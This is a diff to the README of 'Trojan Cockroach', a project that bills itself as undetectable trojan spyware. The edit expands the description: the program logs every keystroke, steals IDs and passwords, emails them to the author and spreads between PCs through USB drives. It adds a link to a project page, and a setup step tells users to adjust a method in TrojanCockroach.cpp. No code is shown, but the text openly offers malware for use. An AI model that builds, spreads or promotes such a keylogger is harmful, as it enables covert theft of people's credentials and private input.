@@ -1,7 +1,7 @@
 # Trojan Cockroach
 #### An Undetectable Trojan Spyware
 
-This program is an undetectable **Trojan Virus** that steals data (ID, password) from PC and sends it to the author.
+<a href="https://MinhasKamal.github.io/TrojanCockroach">This program</a> is an undetectable **Trojan Virus** that steals data (ID, password; every key stroke) from PC and emails it back to the author. It spreads among PCs through USB drives.
 
 ### Setup
 1. Change **--and--()** method of **TrojanCockroach.cpp** according to your wish.
